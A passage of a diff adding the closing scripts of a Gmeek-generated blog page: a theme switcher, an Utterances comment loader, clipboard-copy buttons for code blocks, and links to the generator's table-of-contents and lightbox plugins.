1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","Tangrenbin/tangrenbin.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+<script src='https://blog.meekdai.com/Gmeek/plugins/GmeekTOC.js'></script><script src='https://blog.meekdai.com/Gmeek/plugins/lightbox.js'></script>
+
+</html>
